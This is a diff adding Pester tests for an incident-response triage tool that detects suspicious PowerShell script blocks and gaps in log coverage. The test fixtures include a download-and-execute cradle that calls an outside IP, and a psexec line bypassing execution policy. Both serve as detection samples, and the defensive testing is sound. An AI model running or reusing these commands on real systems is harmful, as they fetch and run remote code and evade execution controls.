@@ -157,3 +157,54 @@ Describe 'ConvertTo-TriageReport.ps1' {
         [System.IO.File]::ReadAllText($o) | Should -Match '<span class="primary">172\.20\.1\.9</span>'
     }
 }
+Describe 'Script block and log coverage leads' {
+    BeforeAll {
+        function New-Sb([string]$Id, [int]$N, [int]$Of, [string]$Text, [string]$Time = '2026-01-01T00:00:00Z', [string]$Path = '') {
+            [pscustomobject]@{ TimeCreated = $Time; EventId = 4104; RecordId = (Get-Random); Data = [pscustomobject]@{ MessageNumber = "$N"; MessageTotal = "$Of"; ScriptBlockText = $Text; ScriptBlockId = $Id; Path = $Path } }
+        }
+        $d = Get-BaselineData
+        $d.events_powershell = @(
+            # One malicious block split over two chunks: the pattern only matches once reassembled.
+            (New-Sb 'aaa' 1 2 '$c = New-Object Net.WebClient; IEX ($c.Downlo'),
+            (New-Sb 'aaa' 2 2 'adString("http://203.0.113.9/p.ps1"))'),
+            # The same benign base64 helper run three times.
+            (New-Sb 'b1' 1 1 '$x = [Convert]::FromBase64String($in)' '2026-01-01T01:00:00Z'),
+            (New-Sb 'b2' 1 1 '$x = [Convert]::FromBase64String($in)' '2026-01-01T02:00:00Z'),
+            (New-Sb 'b3' 1 1 '$x = [Convert]::FromBase64String($in)' '2026-01-01T03:00:00Z'),
+            # Execution policy bypass alone: review, not dropped.
+            (New-Sb 'c1' 1 1 'psexec -s powershell.exe -ExecutionPolicy Bypass -File C:\tools\x.ps1'),
+            # IRTriage's own code (contains the patterns it looks for).
+            (New-Sb 'self' 1 1 '$script:IRToolVersion = ''2.1.1''; # DownloadString IEX( FromBase64String' '2026-01-01T00:00:00Z' 'C:\IR\Invoke-IRTriage.ps1')
+        )
+        $coverage = @{ events_powershell = @{ logCoverage = @(
+            [pscustomobject]@{ log = 'Microsoft-Windows-PowerShell/Operational'; oldestEventUtc = '2026-01-01T08:00:00.0000000Z'; lookbackStartUtc = '2025-12-29T00:00:00.0000000Z'; coversLookback = $false; logMode = 'Circular'; maxSizeMB = 15; fileSizeMB = 15; isFull = $true; recordCount = 500; eventsCollected = 7; truncatedAtMaxEvents = $false }
+        ) } }
+        $zip = New-FakeTriage -Path (Join-Path $root 'sblocks') -Data $d -CollectorExtras $coverage -Zip
+        $leads = @(Get-IRTriageLeads -Triage (Import-IRTriage -Path $zip))
+        $sb = @($leads | Where-Object { $_.Title -like 'Suspicious PowerShell script block*' })
+    }
+    It 'reassembles chunks of one script block before matching' {
+        $sb | Where-Object { $_.Severity -eq 'high' -and $_.Title -match 'download cradle' } | Should -Not -BeNullOrEmpty
+    }
+    It 'groups identical blocks into one lead with a count' {
+        @($sb | Where-Object { $_.Title -match 'base64 decode' }).Count | Should -Be 1
+        ($sb | Where-Object { $_.Title -match 'base64 decode' }).Title | Should -Match 'x3$'
+    }
+    It 'grades base64 decode alone as review' {
+        ($sb | Where-Object { $_.Title -match 'base64 decode' }).Severity | Should -Be 'review'
+    }
+    It 'keeps execution-policy-bypass blocks as review instead of dropping them' {
+        $sb | Where-Object { $_.Severity -eq 'review' -and $_.Title -match 'execution policy bypass' -and $_.Detail -match 'psexec' } | Should -Not -BeNullOrEmpty
+    }
+    It 'does not grade IRTriage''s own code, but reports it with its path' {
+        $sb | Where-Object { $_.Detail -match 'IRToolVersion' } | Should -BeNullOrEmpty
+        $self = $leads | Where-Object { $_.Title -like "IRTriage's own code*" }
+        $self.Severity | Should -Be 'info'
+        $self.Detail | Should -Match 'C:\\IR\\Invoke-IRTriage\.ps1'
+    }
+    It 'raises a review lead when a full log does not reach back to the lookback start' {
+        $cov = $leads | Where-Object { $_.Title -like 'Microsoft-Windows-PowerShell/Operational only reaches back*' }
+        $cov.Severity | Should -Be 'review'
+        $cov.Detail | Should -Match 'full \(15 of 15 MB'
+    }
+}
